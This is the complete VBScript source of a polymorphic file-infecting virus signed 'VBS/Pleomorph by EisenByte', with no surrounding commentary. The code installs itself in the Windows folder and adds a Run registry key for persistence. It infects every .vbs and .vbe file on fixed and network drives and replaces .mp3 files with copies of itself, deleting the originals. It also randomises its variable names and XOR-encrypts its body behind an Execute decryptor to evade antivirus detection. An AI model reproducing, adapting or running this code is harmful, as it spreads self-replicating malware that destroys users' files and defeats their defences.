On Error Resume Next
Rem Start Pleomorph virus
Randomize 
Dim VirNucleo,SDT1,wsh
Dim Charc,VirFName 
Charc = chr(39)
VirNucleo = Wscript.ScriptFullName
Set SDT1 = CreateObject("Scripting.FileSystemObject")
Set wsh = createobject("Wscript.Shell")
VirFName =  "PolyVirs"
Dim VirRepldCode,Array_vars,Array_xe,RChar,VirModif,RCB
Dim LenghtChar,SDL5,SDL6,SDT10,SDT11,SDT12,VirBoDys
VirRepldCode = SDL00
Array_vars=Array("VirRepldCode","Array_vars","Array_xe","RChar","VirModif","RCB", _
"LenghtChar","SDL5","SDL6","SDT10","SDT11","SDT12","VirBoDys","Virus_Main","PolyMorph", _
"EncriptionAlgorit","VirBC","NumberBte","SDT15","XSDT1","Random_Char","VirusOrden", _
"CodePolyVir","CodeCrypter","Charc","VirFName","SDT1","SDT15","XSDT1","SDT19",VirFName,"SDT14",_
"virusPath","CounterMutations","RegMutations","HDSr","msgppl","msgtxt","GFil","Fixt","Exax",_
"VirNucleo","wsh","VirCapside","VirRdCode","HostCapside","HostFected","Fex","GFol","SearchFiles","Folx")
Virus_Main()
Sub Virus_Main()
PolyMorph()
Dim VirusPath,Pleomorph,CounterMutations
Dim RegMutations,HDSr,msgppl,msgtxt
RegMutations = "HKLM\Software\Pleomorph\Mutations"
VirusPath = SDT1.GetSpecialFolder(0) & "\Pleomorph.vbs"
if SDT1.FileExists(VirusPath) = False then
SDT1.CopyFile VirNucleo,VirusPath
end if
CounterMutations = wsh.RegRead(RegMutations)
wsh.RegWrite RegMutations,CounterMutations + 1
wsh.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Poly-test",VirusPath
if CounterMutations > 10 then
MsgPpl = "VBS/Pleomorph by EisenByte (beta)" & vbcrlf & _
"Written in the EisenLabs [MX]" & vbcrlf & _
"This is my first Stuff to the world" & vbcrlf & _
"today 3/12/2004 (re)born a coder :D" & vbcrlf & _
"Inspired in Marisol.../Federal1 (S.B.B.) 2°A" & vbcrlf &_
"Mission Objetive: to show my polymorphic engine in a simple viruse"&vbcrlf&_
"Next species: W32.HLLP.Diskorder and..." & vbcrlf & _
"Marisol i love u :D hehe."
Set msgtxt = SDT1.CreateTextFile("C:\info.ini"):msgtxt.writeline MsgPpl : msgtxt.close
End if
For Each HDSr in SDT1.Drives
if HDSr.DriveType = 2 or HDSr.DriveType = 3 then
SearchFiles(HDSr.Path + "\")
end if
Next
End Sub
Sub SearchFiles(Folx)
Dim GFil,Fixt,Exax
Set GFil = SDT1.GetFolder(Folx).Files
For each Fixt in GFil
Exax = SDT1.GetExtensionName(Lcase(Fixt.Path))
if Exax = "vbs" or Exax = "vbe" then
Set HostCapside = SDT1.OpenTextFile(Fixt.path,1)
HostFected = HostCapside.ReadAll
HostCapside.close
if Instr(HostFected,Charc & "Pleomorph") = 0 then
Dim VirCapside,VirRdCode,HostCapside,HostFected
Set VirCapside = SDT1.OpenTextFile(VirNucleo,1)
VirRdCode = VirCapside.ReadAll
VirCapside.close
Dim InfectingHost
Set InfectingHost = SDT1.CreateTextFile(Fixt.Path)
InfectingHost.WriteLine Charc & "Pleomorph"& vbcrlf & HostFected & vbcrlf & VirRdCode
InfectingHost.Close
end if
Elseif Exax = "mp3" then
SDT1.CopyFile VirNucleo,Fixt.Path + ".vbs"
SDT1.DeleteFile Fixt.Path
End if
next
Dim Fex,GFol
Set GFol = SDT1.getFolder(Folx).Subfolders
For each Fex in GFol
SearchFiles(Fex)
Next
End Sub
Sub PolyMorph()
For Each Array_xe in Array_vars 
RChar=Random_Char(0)
If Instr(VirRepldCode,RChar) <> 0 Then
RChar = RChar & UCase(Chr(Int(Rnd * 22) + 64 + 1) ) & Int(Rnd * int(rnd * 28 ))
End If
VirRepldCode = Replace(VirRepldCode, Array_xe, RChar) :RChar = ""
next
Set VirModif = SDT1.OpenTextFile(Wscript.ScriptFullname, 2 )
Randomize
RCB = Int(Rnd *2) +1
Dim VirusOrden,VirusKey
VirusKey=Random_NumGen()
VirusOrden = Charc & Random_Char(Int(Rnd * 200)+1) & vbcrlf & CodePolyVir(VirRepldCode,VirusKey) &vbcrlf& Charc & Random_Char(Int(Rnd * 300)+1) & vbcrlf & CodeCrypter(VirusKey) &vbcrlf & Charc & Random_Char(Int(Rnd * 200)+1) & Charc & "Pleomorph" & Charc & Random_Char(Int(Rnd * 10)+3)
if RCB = 1 Then
VirModif.WriteLine VirusOrden
Else
VirusOrden = Charc & Random_Char(Int(Rnd * 250)+1) & vbcrlf& CodeCrypter(VirusKey) &vbcrlf& Charc & Random_Char(Int(Rnd * 200)+1) &vbcrlf & CodePolyVir(VirRepldCode,VirusKey) &vbcrlf& Charc & Random_Char(Int(Rnd * 120)+1) & Charc & "Pleomorph" & Charc & Random_Char(Int(Rnd * 10)+3)
VirModif.WriteLine VirusOrden
End if
VirModif.close
End Sub
Function EncriptionAlgorit(VirBC,NumberBte) 
Dim SDT15,XSDT1
For SDT15 = 1 to len(VirBC) : XSDT1 = Asc(Mid(VirBC, SDT15, 1))
EncriptionAlgorit = EncriptionAlgorit + Chr(XSDT1 Xor NumberBte)
next 
End Function
Function Random_Char(LenghtChar)
SDL6 = ""
if LenghtChar = 0 then
LenghtChar = Int(Rnd * 18) + 6
End if
For SDL5 = 1 To LenghtChar :If Int(Rnd * 2)+1 = 1 then
SDL6 = SDL6 & Lcase(Chr(Int(Rnd * 22) + 64+1))
If Int(Rnd * 2)+1=1 then
SDL6 = SDL6 & Int(Rnd * int(rnd * 6)) 
End If
else
SDL6 = SDL6 & UCase(Chr(Int(Rnd * 22)+64+1))
if Int( Rnd * 2 )+1 = 1 then
SDL6 = SDL6 & Int(Rnd * Int( Rnd * 2 )) 
else
SDL6 = SDL6 & Int(Rnd * int(rnd * 8)) 
End If 
End If
next
Random_Char=SDL6
End Function
Function Random_NumGen() 
SDT10 = 2:
SDT11 = Int(Rnd*6)
SDT12 = int(Rnd*6) 
Random_NumGen = SDT10 & SDT11 & SDT12 
End Function
Function CodePolyVir(VirBoDys,NumGenx)
CodePolyVir="Function "& VirFName &"()"& vbcrlf & VirFName &"=" & Chr(34) & EncriptionAlgorit(VirBoDys,NumGenX) & chr(34) & ":End Function"
End Function
Function CodeCrypter(NPOEncrypt)
CodeCrypter = "Execute("+Chr(34)+"Dim SDT15,XSDT1,SDT19,SDL00"+chr(34)+_
"+Vbcrlf+"+chr(34)+"For SDT15 = 1 To len("& VirFName & "()"&")"+chr(34)+ _
"+vbcrlf+"+chr(34)+"XSDT1 = Asc(Mid("& VirFName &"()"&",SDT15,1))"+chr(34)+ _
"+vbcrlf+"+chr(34)+"SDT14 = SDT14 + Chr(XSDT1 Xor " + NPOEncrypt +")"+Chr(34)+ _
"+vbcrlf+"+chr(34)+"next:SDL00=SDT14"+ chr(34) +"):Execute(SDL00)" & Charc & Random_Char(Int(Rnd * 190)+1)
End Function
      
